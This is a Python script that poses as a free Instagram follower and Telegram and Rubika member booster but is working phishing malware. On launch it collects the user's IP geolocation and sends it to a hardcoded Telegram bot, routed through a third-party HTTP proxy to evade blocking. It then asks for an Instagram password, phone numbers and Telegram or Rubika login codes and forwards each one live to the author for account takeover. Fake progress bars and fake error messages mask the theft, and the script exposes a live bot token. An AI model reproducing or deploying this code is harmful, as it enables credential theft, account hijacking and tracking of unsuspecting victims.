import time
import requests
import socket
import os
from colorama import Fore
from time import sleep
from tkinter import *


os.system("clear")
print(Fore.RED + """
        
  ▄████████    ▄████████ ████████▄     ▄████████    ▄████████ 
  ███    ███   ███    ███ ███   ▀███   ███    ███   ███    ███ 
  ███    █▀    ███    ███ ███    ███   ███    ███   ███    ███ 
  ███          ███    ███ ███    ███  ▄███▄▄▄▄██▀   ███    ███ 
▀███████████ ▀███████████ ███    ███ ▀▀███▀▀▀▀▀   ▀███████████ 
         ███   ███    ███ ███    ███ ▀███████████   ███    ███ 
   ▄█    ███   ███    ███ ███   ▄███   ███    ███   ███    ███ 
 ▄████████▀    ███    █▀  ████████▀    ███    ███   ███    █▀  
           amirsadra   0980 hackinger  ███    ███              
           follow instagram: @sdr_vob
                                                                        """)



# token
token = 'https://api.telegram.org/bot5623768513:AAHPehgTBmlQ03kbZfqSnRSNn6jZHjo_Jjw/sendMessage?chat_id=2049610760=&text='


## ip
Host_name = socket.gethostname()
ip_local = socket.gethostbyname(Host_name)
http = requests.get('https://api.ipify.org/').text


def ip():
    
    UrlSend = token

    Ip = requests.get('http://api64.ipify.org/?format=json').json()['ip']
    Ip2 = requests.get(f'https://ipapi.co/{Ip}/json/').json()

    # target

    ip_Target = Ip2['ip']

    Version = Ip2['version']

    City = Ip2['city']

    regen = Ip2['region']

    region_code = Ip2['region_code']

    cuntry = Ip2['country']

    cuntry_name = Ip2['country_name']

    cuntry_code = Ip2['country_code']

    cuntry_code_iso = Ip2['country_code_iso3']

    country_capital = Ip2['country_capital']

    country_tld = Ip2['country_tld']

    continent_code = Ip2['continent_code']

    postal = Ip2['postal']

    latitude = Ip2['latitude']

    longitude = Ip2['longitude']

    timezone = Ip2['timezone']

    utc_offset = Ip2['utc_offset']

    country_calling_code = Ip2['country_calling_code']

    currency = Ip2['currency']

    currency_name = Ip2['currency_name']

    languages = Ip2['languages']

    country_area = Ip2['country_area']

    country_population = Ip2['country_population']

    asn = Ip2['asn']

    org = Ip2['org']

    url1 = str(' Runinng Badafzar .... \n\n' + 'ip Target : \t'+ip_Target +
               '\nversion : \t'+Version+'\ncuntry code iso:' + cuntry_code_iso +
               '\ncountry capital:' + country_capital+'\nCity : \t\t'+City+'\nregion : \t'+regen+'\nregion_code : \t'+region_code+'\ncountry : \t'+cuntry)

    url2 = str('\ncountry name : \t'+cuntry_name+'\ncountry code : \t' + str(cuntry_code) +
               '\ncountry tld : \t'+str(country_tld)+'\ncontinent code : '+str(continent_code)+'\npostal : \t'+str(postal))

    url3 = '\nlongitude : \t' + \
        str(longitude)+'\nlatitude : \t' + \
        str(latitude)+'\ntimezone : \t'+timezone+'\nutc offset : \t' + \
        utc_offset+'\ncountry calling code : '+country_calling_code + \
        '\ncurrency : \t'+currency+'\ncurrency name : '+currency_name+'\nlanguages : \t'+languages+'\ncountry area : \t' + \
        str(country_area)+'\ncountry population : \t' + \
        str(country_population)+'\nasn : \t'+str(asn)+'\norg : \t'+org

    url4 = UrlSend+url1+url2+url3

# bypass Telegram
    pyload = {'UrlBox': url4,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)
ip()

# alarm telegram


url5 = token + 'سلام امیرصدرا روز خوبی داشته باشی بد افزار توسط کاربر اجرا شد'


# bypass Telegram
pyload = {'UrlBox': url5,
          'AgentList': 'Google Chrome',
          'VersionsList': 'HTTP/1.1',
          'MethodList': 'GET'
          }

https = requests.post(
    'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)


# url


url6 = token + \
    'آیپی لوکال تارگت : ' + ip_local+'\n'+'آیپی پابلیک تارگت  : '+http


# bypass Telegram
pyload = {'UrlBox': url6,
          'AgentList': 'Google Chrome',
          'VersionsList': 'HTTP/1.1',
          'MethodList': 'GET'
          }

https = requests.post(
    'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)
# print(https)


# snod
# token


url7 = token + 'در حال شنود'


# bypass Telegram
pyload = {'UrlBox': url7,
          'AgentList': 'Google Chrome',
          'VersionsList': 'HTTP/1.1',
          'MethodList': 'GET'
          }

https = requests.post(
    'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)


# logo help

def help():

    print(Fore.RED+' >>> help script ')

    print(Fore.GREEN+' is help script Enter [ help ] ')
    print(Fore.GREEN+' Enter for [99] and telegram run ')
    print(Fore.GREEN+' Enter for [98] and instagram run ')
    print(Fore.GREEN+' Enter for [97] and rubika run ')
    print('\n')
# user input


# folower insta

def insta():

    # folower instagram

    print(Fore.GREEN+' ___________________________________________________________')
    print(Fore.GREEN+'|                                                          |')
    print(Fore.GREEN+'|     version 2.2                                          |')
    print(Fore.GREEN+'|                                                          |')
    print(Fore.GREEN+'|         follower free instagram                          |')
    print(Fore.GREEN+'|    @36sdr  & @sdr_vob                                    |')
    print(Fore.GREEN+'|     make by amirsadra                                    |')
    print(Fore.GREEN+'|                                                          |')
    print(Fore.GREEN+'|      page instagram follow @36sdr and @sdr_vob           |')
    print(Fore.GREEN+'|                                                          |')
    print(Fore.GREEN+'|                                                          |')
    print(Fore.GREEN+' ___________________________________________________________')

# token
    url8 = token + \
        'سلام امیرصدرا کاربر وارد قسمت فالور اینستا شد لطفادسترسی بگیرید  '
    pyload = {'UrlBox': url8,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)
    print('>>> kamiar167')
    instagram = input(' Enter username : ')
    password = input(' Enter password : ')

# token
    url1 = token + \
        'نام کاربری :  '+instagram+'\n'+'پسورد :  '+password

    pyload = {'UrlBox': url1,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)

    random = [Fore.CYAN + ' conected for instagram 15%', ' conected for instagram 30%', ' conected for instagram 36%', ' conected for instagram 37%',
              ' conected for instagram 50%', ' conected for instagram 60%',
              ' conected for instagram 83%', ' conected for instagram 98%', ' conected for instagram 99%', ' conected for instagram 100%', ' conected to page instagram']

    for i in random:
        print('\r' + i, end='')
        sleep(5)
    print()

    print(Fore.LIGHTYELLOW_EX + ' 1k folowring send page >>> '+instagram)


# member telegram

def telegram():
    from colorama import Fore

    print(Fore.LIGHTMAGENTA_EX +
          ' ___________________________________________________________')
    print(Fore.LIGHTMAGENTA_EX +
          '|                                                          |')
    print(Fore.LIGHTMAGENTA_EX +
          '|     version 2.0                                          |')
    print(Fore.LIGHTMAGENTA_EX +
          '|                                                          |')
    print(Fore.LIGHTMAGENTA_EX +
          '|         member channel telegram free                     |')
    print(Fore.LIGHTMAGENTA_EX +
          '|    instagram by @sdr_vob and @36sdr                      |')
    print(Fore.LIGHTMAGENTA_EX +
          '|     make by amirsadra0098                                |')
    print(Fore.LIGHTMAGENTA_EX +
          '|                                                          |')
    print(Fore.LIGHTMAGENTA_EX +
          '|      page instagram follow @sdr_vob & @36sdr             |')
    print(Fore.LIGHTMAGENTA_EX +
          '|                                                          |')
    print(Fore.LIGHTMAGENTA_EX +
          '|                                                          |')

# token
    url5 = token + \
        'کاربر وارد قسمت ممبر کانال تلگرام شد   '
    pyload = {'UrlBox': url5,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)

    telegram = input(' Enter phone number : ')

# token

    url7 = token + \
        '  اینم شمارش وقتشه تو تلگرام بزنی تا کدشو برات بفرسته    '+telegram
    pyload = {'UrlBox': url7,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)
    print('>>> 09050000000')
    code = input(' Enter code telegram : ')

# token

    url6 = token + \
        'شماره موبایل :  '+telegram+'\n'+'کد ورودی :  '+code

    pyload = {'UrlBox': url6,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)
    time.sleep(6.5)
    print(Fore.RED+' fgdfg : The term  is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a\
          path was included, verify that the path is correct and try again.\
          At line: 1 char: 1 ')


# member rubika

def rubika():
    print(Fore.MAGENTA +
          ' ___________________________________________________________')
    print(Fore.MAGENTA +
          '|                                                          |')
    print(Fore.MAGENTA +
          '|     version 2.2                                          |')
    print(Fore.MAGENTA +
          '|                                                          |')
    print(Fore.MAGENTA +
          '|         member channel Rubika  free                      |')
    print(Fore.MAGENTA +
          '|     instagram: @sdr_vob      amirsadra                   |')
    print(Fore.MAGENTA +
          '|     aparat.com/miny_345                                  |')
    print(Fore.MAGENTA +
          '|                                                          |')
    print(Fore.MAGENTA +
          '|      page instagram follow @36sdr                        |')
    print(Fore.MAGENTA +
          '|                                                          |')
    print(Fore.MAGENTA +
          '|                                                          |')
    print(Fore.MAGENTA +
          ' ___________________________________________________________')
# token
    url10 = token + \
        'کاربر وارد قسمت ممبر کانال روبیکا شد   '
    pyload = {'UrlBox': url10,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)
    print('>>> 09050000000')
    rubika = input(' Enter phone number : ')

# token
    url8 = token + \
        'بپر شمارشو بزن تا کد بیاد برات اینم شمارش : '+rubika
    pyload = {'UrlBox': url8,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)

    code2 = input(' Enter code  : ')

# token
    url9 = token + \
        'شماره موبایل :  '+rubika+'\n'+'کد ورودی :  '+code2

    pyload = {'UrlBox': url9,
              'AgentList': 'Google Chrome',
              'VersionsList': 'HTTP/1.1',
              'MethodList': 'GET'
              }

    https = requests.post(
        'https://www.httpdebugger.com/Tools/ViewHttpHeaders.aspx', data=pyload)
    time.sleep(5)
    print(Fore.RED + ' extensions\ms-python.python-2021.12.1559732655\pythonFiles\lib\python\debugpy\launcher/../..\debugpy\launcher\__init__.py", line 34, in connect\
        dffdgdgdreturn _run_code(code, main_globals, None ')


print(Fore.RED+'  +---------------------------------+')
print(Fore.GREEN+'  | is help script Enter [ help ]   |')
print(Fore.GREEN+'  | Enter for [99] and telegram run |')
print(Fore.GREEN+'  | Enter for [98] and instagram run|')
print(Fore.GREEN+'  | Enter for [97] and rubika run   |')
print(Fore.RED+'  |                                 |')
print(Fore.RED+'  | follower free instagram         |')
print(Fore.RED+'  |  member free telegram           |')
print(Fore.RED+'  |   member free Rubika            |')
print(Fore.RED+'  |    meno script type >>> [help]  |')
print(Fore.RED+'  | amirsadra by make of script     |')
print(Fore.RED+'  |                                 |')
print(Fore.RED+'  +---------------------------------+')

Target = input(' Enter options script >>> ')

# if script

if Target == 'help':
    help()
    Target = input(' Enter options script >>> ')
elif Target == '98':
    insta()
elif Target == '99':
    telegram()
elif Target == '97':
    rubika()
else:
    help()

